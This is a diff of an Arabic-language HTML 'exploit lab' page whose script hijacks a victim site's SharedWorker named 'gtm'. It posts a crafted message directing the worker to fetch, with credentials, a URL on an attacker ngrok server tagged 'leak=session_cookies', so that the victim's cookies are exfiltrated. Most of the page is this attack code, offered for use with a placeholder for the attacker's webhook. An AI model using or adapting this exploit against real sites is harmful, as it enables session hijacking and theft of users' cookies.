@@ -1,62 +1,81 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>صفحة اختبار أمني - Exploiting SharedWorker</title>
+    <title>Exploit Lab - SharedWorker Hijacking</title>
     <style>
-        body { font-family: sans-serif; background-color: #f4f4f4; padding: 20px; }
-        .log-box { background: #000; color: #0f0; padding: 15px; border-radius: 5px; height: 200px; overflow-y: scroll; }
-        .status { color: red; font-weight: bold; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 20px; background: #f0f2f5; }
+        .card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); border-top: 5px solid #d9534f; }
+        .terminal { background: #1e1e1e; color: #4af626; padding: 15px; border-radius: 5px; font-family: 'Courier New', Courier, monospace; min-height: 150px; white-space: pre-wrap; margin-top: 20px; }
+        .btn { background: #d9534f; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        .btn:hover { background: #c9302c; }
+        .status { font-weight: bold; color: #d9534f; }
     </style>
 </head>
 <body>
-    <h1>مختبر استغلال ثغرات الـ Worker</h1>
-    <p>الحالة: <span id="status" class="status">جاري البحث عن أهداف...</span></p>
-    
-    <div class="log-box" id="logs">
-        [+] جاري محاولة الاتصال بالـ SharedWorker الخاص بموقع الضحية...<br>
+
+    <div class="card">
+        <h2>مختبر استغلال ثغرة وسيط النقل (SharedWorker)</h2>
+        <p>هذه الصفحة تحاكي هجوماً يعتمد على الكود الثاني والثالث المكتشفين في موقع الضحية.</p>
+        <p>الحالة: <span id="status" class="status">في انتظار بدء الهجوم...</span></p>
+        
+        <button class="btn" onclick="startExploit()">بدء عملية التسريب (Exfiltration)</button>
+
+        <div class="terminal" id="console">
+> جاري تهيئة بيئة الاختبار...
+        </div>
     </div>
 
     <script>
-        const logs = document.getElementById('logs');
-        const status = document.getElementById('status');
+        const terminal = document.getElementById('console');
+        const statusText = document.getElementById('status');
 
-        function addLog(msg) {
-            logs.innerHTML += `[+] ${msg}<br>`;
+        function log(msg) {
+            terminal.innerText += `\n> ${msg}`;
+            terminal.scrollTop = terminal.scrollHeight;
         }
 
-        // 1. محاولة الوصول للـ Worker بالاسم الذي حدده الكود (gtm)
-        try {
-            // في البيئات الضعيفة أمنياً، يمكن الاتصال بالـ Worker عبر اسمه فقط
-            const attackerPort = new SharedWorker("", "gtm").port;
+        async function startExploit() {
+            log("بدء البحث عن SharedWorker باسم 'gtm'...");
+            statusText.innerText = "جاري الهجوم...";
 
-            attackerPort.onmessage = function(event) {
-                addLog("استجابة مستلمة من الضحية: " + JSON.stringify(event.data));
-            };
+            try {
+                // 1. محاكاة الكود الثاني: الاتصال بالـ Worker الذي أنشأته الضحية
+                // نستخدم اسم الـ Worker "gtm" كما ورد في الكود الأصلي
+                const worker = new SharedWorker("", "gtm");
+                const port = worker.port;
 
-            attackerPort.start();
-            addLog("تم إنشاء قناة اتصال مع الـ Worker بنجاح.");
-            status.innerText = "متصل بالهدف!";
+                port.onmessage = function(e) {
+                    log("استجابة من الـ Worker: " + JSON.stringify(e.data));
+                };
 
-            // 2. إرسال الحمولة الخبيثة (Payload)
-            // نجعل الـ Worker يظن أنه يرسل بيانات عادية، لكننا نوجهه لخادمنا
-            const payload = {
-                url: "https://subsphenoidal-dauntlessly-pura.ngrok-free.dev", // خادم المهاجم لاستقبال البيانات
-                retryIntervals: [0],
-                data: {
-                    // تزييف كائن يمر من فحص isFormData
-                    append: function() {},
-                    toString: function() { return "[object FormData]"; }
-                }
-            };
+                port.start();
+                log("تم اختطاف قناة الاتصال بالـ SharedWorker بنجاح.");
 
-            addLog("جاري إرسال طلب تسريب البيانات (Exfiltration)...");
-            attackerPort.postMessage(payload);
-            addLog("تم إرسال الطلب. سيقوم المتصفح بإرفاق Cookies الضحية تلقائياً.");
+                // 2. محاكاة الكود الثالث: صياغة الرابط الخبيث (Payload)
+                // بناء الرابط كما يفعل الكود الثالث في دالة Dz (Format 6)
+                const attackerServer = "https://subsphenoidal-dauntlessly-pura.ngrok-free.dev"; // ضع رابط Webhook هنا للاختبار
+                const maliciousPayload = {
+                    url: attackerServer + "?leak=session_cookies&origin=" + encodeURIComponent(window.location.href),
+                    retryIntervals: [0, 1000, 5000], // مستوحى من المصفوفة Uy في الكود الثاني
+                    commandType: 0 // مستوحى من الكود الثاني
+                };
 
-        } catch (error) {
-            addLog("خطأ: " + error.message);
-            status.innerText = "فشل الاتصال (محمي بواسطة المتصفح أو CSP)";
+                log("جاري إرسال الحمولة (Payload) لإجبار الـ Worker على تنفيذ Fetch...");
+                
+                // 3. التنفيذ: إرسال الرسالة التي ستؤدي لطلب Fetch مع Credentials
+                port.postMessage(maliciousPayload);
+
+                log("تم إرسال الطلب بنجاح.");
+                log("بسبب 'credentials: include' في كود الضحية، سيتم إرسال الـ Cookies الآن إلى خادم المهاجم.");
+                statusText.innerText = "اكتمل الهجوم! تحقق من خادمك.";
+                statusText.style.color = "#5cb85c";
+
+            } catch (err) {
+                log("خطأ: " + err.message);
+                log("تنبيه: المتصفح قد يمنع الوصول العابر للنطاقات (Cross-Origin) للـ SharedWorker.");
+                statusText.innerText = "فشل الهجوم (حماية المتصفح).";
+            }
         }
     </script>
 </body>
